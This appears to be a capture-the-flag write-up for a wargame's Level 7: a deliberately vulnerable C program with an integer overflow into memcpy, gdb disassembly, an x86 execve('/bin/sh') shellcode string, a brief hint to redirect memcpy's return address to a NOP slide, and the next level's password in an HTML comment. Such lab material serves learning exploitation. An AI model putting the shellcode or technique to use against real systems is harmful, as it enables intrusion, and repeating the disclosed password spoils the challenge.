## Level 7:

```c
 1 //written by bla
 2 #include <stdio.h>
 3 #include <string.h>
 4 #include <unistd.h>
 5 
 6 
 7 
 8 int main(int argc, char **argv)
 9 {
10 
11         int count = atoi(argv[1]);
12         int buf[10];
13 
14         if(count >= 10 )
15                 return 1;
16 
17 
18         memcpy(buf, argv[2], count * sizeof(int));
19 
20         if(count == 0x574f4c46) {
21         printf("WIN!\n");
22                 execl("/bin/sh", "sh" ,NULL);
23     } else
24                 printf("Not today son\n");
25 
26 
27         return 0;
28 }
```

```console
(gdb) disass main
Dump of assembler code for function main:
   0x08048414 <+0>:	push   %ebp
   0x08048415 <+1>:	mov    %esp,%ebp
   0x08048417 <+3>:	sub    $0x68,%esp
   0x0804841a <+6>:	and    $0xfffffff0,%esp
   0x0804841d <+9>:	mov    $0x0,%eax
   0x08048422 <+14>:	sub    %eax,%esp
   0x08048424 <+16>:	mov    0xc(%ebp),%eax
   0x08048427 <+19>:	add    $0x4,%eax
   0x0804842a <+22>:	mov    (%eax),%eax
   0x0804842c <+24>:	mov    %eax,(%esp)
   0x0804842f <+27>:	call   0x8048354 <atoi@plt>
   0x08048434 <+32>:	mov    %eax,-0xc(%ebp)
   0x08048437 <+35>:	cmpl   $0x9,-0xc(%ebp)
   0x0804843b <+39>:	jle    0x8048446 <main+50>
   0x0804843d <+41>:	movl   $0x1,-0x4c(%ebp)
   0x08048444 <+48>:	jmp    0x80484ad <main+153>
   0x08048446 <+50>:	mov    -0xc(%ebp),%eax
   0x08048449 <+53>:	shl    $0x2,%eax
   0x0804844c <+56>:	mov    %eax,0x8(%esp)
   0x08048450 <+60>:	mov    0xc(%ebp),%eax
   0x08048453 <+63>:	add    $0x8,%eax
   0x08048456 <+66>:	mov    (%eax),%eax
   0x08048458 <+68>:	mov    %eax,0x4(%esp)
   0x0804845c <+72>:	lea    -0x48(%ebp),%eax
   0x0804845f <+75>:	mov    %eax,(%esp)
   0x08048462 <+78>:	call   0x8048334 <memcpy@plt>
   0x08048467 <+83>:	cmpl   $0x574f4c46,-0xc(%ebp)
   0x0804846e <+90>:	jne    0x804849a <main+134>
   0x08048470 <+92>:	movl   $0x8048584,(%esp)
   0x08048477 <+99>:	call   0x8048344 <printf@plt>
   0x0804847c <+104>:	movl   $0x0,0x8(%esp)
   0x08048484 <+112>:	movl   $0x804858a,0x4(%esp)
   0x0804848c <+120>:	movl   $0x804858d,(%esp)
   0x08048493 <+127>:	call   0x8048324 <execl@plt>
   0x08048498 <+132>:	jmp    0x80484a6 <main+146>
   0x0804849a <+134>:	movl   $0x8048595,(%esp)
   0x080484a1 <+141>:	call   0x8048344 <printf@plt>
   0x080484a6 <+146>:	movl   $0x0,-0x4c(%ebp)
   0x080484ad <+153>:	mov    -0x4c(%ebp),%eax
   0x080484b0 <+156>:	leave  
   0x080484b1 <+157>:	ret    
End of assembler dump.
(gdb) disass memcpy
Dump of assembler code for function memcpy:
   0xb7e85d60 <+0>:	call   0xb7f2f37d
   0xb7e85d65 <+5>:	add    $0x13c29b,%edx
   0xb7e85d6b <+11>:	mov    -0xe0(%edx),%ecx
   0xb7e85d71 <+17>:	lea    -0x13c230(%edx),%eax
   0xb7e85d77 <+23>:	testl  $0x4000000,0x68(%ecx)
   0xb7e85d7e <+30>:	je     0xb7e85db3 <memcpy+83>
   0xb7e85d80 <+32>:	lea    -0x8b480(%edx),%eax
   0xb7e85d86 <+38>:	testl  $0x10,0x98(%ecx)
   0xb7e85d90 <+48>:	jne    0xb7e85db3 <memcpy+83>
   0xb7e85d92 <+50>:	testl  $0x200,0x64(%ecx)
   0xb7e85d99 <+57>:	je     0xb7e85db3 <memcpy+83>
   0xb7e85d9b <+59>:	lea    -0x8a690(%edx),%eax
   0xb7e85da1 <+65>:	testl  $0x1,0x98(%ecx)
   0xb7e85dab <+75>:	je     0xb7e85db3 <memcpy+83>
   0xb7e85dad <+77>:	lea    -0x84450(%edx),%eax
   0xb7e85db3 <+83>:	ret    
End of assembler dump.
```

```
shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

Change the return address inside the memcpy to point to the shell code or at leaste the NOP slide.

<!-- Level 8 password ==> VSIhoeMkikH6SGht -->